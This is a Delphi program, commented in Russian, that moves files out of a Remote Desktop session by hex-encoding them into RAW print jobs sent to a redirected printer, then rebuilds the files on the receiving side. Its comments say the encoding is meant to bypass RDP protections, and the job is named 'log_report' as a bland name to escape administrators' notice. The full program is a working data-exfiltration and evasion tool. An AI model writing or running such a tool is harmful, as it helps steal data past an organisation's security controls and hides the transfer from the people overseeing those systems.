program RDPFileTransfer;

{$APPTYPE CONSOLE}

uses
  SysUtils,
  Classes,
  WinSpool,
  Windows, Vcl.Dialogs, vcl.Forms, vcl.Printers, vcl.StdCtrls, System.UITypes,
  Vcl.ComCtrls, Winapi.ShellAPI;

// Функция для перевода куска байт в Hex-текст (чтобы принтер не захлебнулся бинарными данными)
function BytesToHexStr(const Buffer: array of Byte; Count: Integer): AnsiString;
const
  HexChars: array[0..15] of AnsiChar = '0123456789ABCDEF';
var
  I: Integer;
begin
  SetLength(Result, Count * 2);
  for I := 0 to Count - 1 do
  begin
    Result[1 + I * 2] := HexChars[Buffer[I] shr 4];
    Result[2 + I * 2] := HexChars[Buffer[I] and $0F];
  end;
end;

function GetProgressForm(out AProgress: TProgressBar): TForm;
begin
  Result := TForm.Create(nil);
  Result.Caption := 'Progress print';
  Result.Width := 350;
  Result.Height := 120;
  Result.Position := poScreenCenter;
  Result.BorderStyle := bsDialog; // Фиксированное окно, нельзя закрыть крестиком
  Result.BorderIcons := [];

  AProgress := TProgressBar.Create(Result);
  AProgress.Parent := Result;
  AProgress.Left := 15;
  AProgress.Top := 40;
  AProgress.Width := 305;
  AProgress.Height := 25;
  AProgress.Smooth := True;
end;

procedure SendFileToRDPPrinter(const FilePath, PrinterName: string);
var
  FS: TFileStream;
  Handle: THandle;
  DocInfo: TDocInfo1;
  Buffer: array[0..4095] of Byte; // Читаем мелкими блоками по 4КБ, чтобы не вешать память
  BytesRead: Integer;
  HexChunk: AnsiString;
  BytesWritten: DWORD;
  Form: TForm;
  Progress: TProgressBar;
  MarkerName: AnsiString;
begin

  // 1. Открываем принтер через WinAPI
  if not OpenPrinter(PChar(PrinterName), Handle, nil) then
  begin
    ShowMessage('printer not available.');
    Halt;
  end;

  try
    Form := GetProgressForm(Progress);

    Form.Show;
    Application.ProcessMessages;

    // Заполняем структуру задания печати
    DocInfo.pDocName := PChar('log_report'); // Безликое имя для админов
    DocInfo.pOutputFile := nil;
    DocInfo.pDatatype := PChar('RAW'); // Отправляем как сырой текст

    // 2. Стартуем документ в очереди печати
    if StartDocPrinter(Handle, 1, @DocInfo) = 0 then
    begin
      ShowMessage('printer not initialized.');
      Halt;
    end;

    if not StartPagePrinter(Handle) then Halt;

    FS := TFileStream.Create(FilePath, fmOpenRead or fmShareDenyWrite);
    try
      Progress.Min := 0;
      Progress.Max := FS.Size;
      Progress.Position := 0;

      MarkerName := 'printertrans:' + ExtractFileName(FilePath) + ':';
      WritePrinter(Handle, PAnsiChar(MarkerName), Length(MarkerName), BytesWritten);

      // Читаем файл блоками
      while FS.Position < FS.Size do
        begin
          BytesRead := FS.Read(Buffer, SizeOf(Buffer));
          // Кодируем в чистый текст на лету, чтобы обойти защиту RDP
          HexChunk := BytesToHexStr(Buffer, BytesRead);

          // Отправляем текстовый кусок прямо в порт принтера
          WritePrinter(Handle, PAnsiChar(HexChunk), Length(HexChunk), BytesWritten);

          Progress.Position := FS.Position;
          Application.ProcessMessages;
        end;
    finally
      FS.Free;
    end;

    EndPagePrinter(Handle);
    EndDocPrinter(Handle);
  finally
    ClosePrinter(Handle);
    Form.Free;
  end;
end;

function SelectPrinterGui: string;
var
  Frm: TForm;
  ListBox: TListBox;
  BtnOk: TButton;
  I: Integer;
begin
  Result := '';

  // 1. Создаем форму на лету
  Frm := TForm.Create(nil);
  try
    Frm.Caption := 'Выбор принтера';
    Frm.Width := 400;
    Frm.Height := 300;
    Frm.Position := poScreenCenter;
    Frm.BorderStyle := bsDialog; // Фиксированный размер окна

    // 2. Создаем ListBox для списка принтеров
    ListBox := TListBox.Create(Frm);
    ListBox.Parent := Frm;
    ListBox.Left := 10;
    ListBox.Top := 10;
    ListBox.Width := 365;
    ListBox.Height := 200;

    // Заполняем ListBox всеми принтерами, установленными в системе
    // (Сюда автоматически попадут и все "перенаправленные" принтеры RDP)
    for I := 0 to Printer.Printers.Count - 1 do
    begin
      ListBox.Items.Add(Printer.Printers[I]);
    end;

    // Если нашли принтеры, выделяем первый по умолчанию
    if ListBox.Items.Count > 0 then
      ListBox.ItemIndex := 0;

    // 3. Создаем кнопку ОК
    BtnOk := TButton.Create(Frm);
    BtnOk.Parent := Frm;
    BtnOk.Caption := 'ОК';
    BtnOk.Left := 150;
    BtnOk.Top := 220;
    BtnOk.Width := 90;
    BtnOk.Height := 30;
    BtnOk.ModalResult := mrOk; // Кнопка автоматически закроет форму с результатом mrOk

    // 4. Показываем форму модально (блокируя выполнение, пока не закроют)
    if Frm.ShowModal = mrOk then
    begin
      if ListBox.ItemIndex >= 0 then
      begin
        // Забираем имя выбранного принтера
        Result := ListBox.Items[ListBox.ItemIndex];
      end;
    end;
  finally
    Frm.Free; // Освобождаем память формы и всех ее дочерних элементов
  end;
end;

function GetByte(h1, h2: AnsiChar): Byte;
var b1, b2: Byte;
begin
  if h1 in ['0'..'9'] then b1 := Ord(h1) - 48
  else if h1 in ['A'..'F'] then b1 := Ord(h1) - 55
  else b1 := Ord(h1) - 87; // Для строчных 'a'..'f'

  if h2 in ['0'..'9'] then b2 := Ord(h2) - 48
  else if h2 in ['A'..'F'] then b2 := Ord(h2) - 55
  else b2 := Ord(h2) - 87;

  Result := (b1 shl 4) or b2;
end;

var
  SrcFile, PrnName, ResFileName: string;
  FS: TFileStream;
  RS: TFileStream;
  Marker: AnsiString;
  Ch: AnsiChar;
  HexChars: array[0..65535] of AnsiChar;
  BinBuffer: array[0..32767] of Byte;
  HexPair: string;
  B: Byte;
  Progress: TProgressBar;
  cbytes, i, ii: Integer;

begin
  with TOpenDialog.Create(nil) do
    try
      // Задаем настройки диалога
      Title := 'Выберите файл';
      InitialDir := 'C:\'; // Стартовая папка
      Filter := 'Все файлы (*.*)|*.*';

      // Показываем диалог. Передаем 0 (дескриптор рабочего стола) в качестве родительского окна
      if Execute(0) then
      begin
        SrcFile := FileName; // Забираем полный путь к выбранному файлу
      end;
    finally
      Free; // Обязательно освобождаем память
    end;

  if not FileExists(SrcFile) then
    begin
      ShowMessage('file not exists.');
      Halt;
    end;

  FS := TFileStream.Create(SrcFile, fmOpenRead or fmShareDenyWrite);
  try
    SetLength(Marker, 12);
    if FS.Size >= 12 then FS.Read(Marker[1], 12);
    if Marker = 'printertrans' then
      begin
        while FS.Position < FS.Size do
          begin
            FS.ReadData(Ch);
            if Ch = ':' then
              begin
                if ResFileName = '' then Continue else break;
              end
            else ResFileName := ResFileName + Ch;
          end;

        PrnName := ExtractFilePath(SrcFile) + ResFileName;
        if FileExists(PrnName) then
          SysUtils.DeleteFile(PrnName);

        RS := TFileStream.Create(PrnName, fmCreate);
        try
          with GetProgressForm(Progress) do
            try
              Progress.Min := 0;
              Progress.Max := FS.Size;
              Progress.Position := 0;
              Show;
              Application.ProcessMessages;

              while FS.Position < FS.Size do
                begin
                  cbytes := FS.Read(HexChars, SizeOf(HexChars));
                  if cbytes < 2 then Break;
                  if cbytes mod 2 <> 0 then Dec(cbytes);
                  i := 0;
                  ii := 0;

                  while i < cbytes do
                    begin
                      BinBuffer[ii] := GetByte(HexChars[i], HexChars[i + 1]);
                      Inc(i, 2);
                      Inc(ii, 1);
                    end;
                  RS.Write(BinBuffer, cbytes div 2);

                  Progress.Position := FS.Position;
                  Application.ProcessMessages;
                end;
            finally
              Free
            end;
          ShowMessage('file restored.');
          PrnName := '/select,"' + PrnName + '"';
          ShellExecute(
            0,
            PChar('open'),
            PChar('explorer.exe'),
            PChar(PrnName),
            nil,
            SW_SHOWNORMAL
          );
        finally
          RS.Free;
        end;
        Exit;
      end;
  finally
    FS.Free;
  end;

  PrnName := SelectPrinterGui;

  SendFileToRDPPrinter(SrcFile, PrnName);

  ShowMessage('OK...');
  Exit;
end.
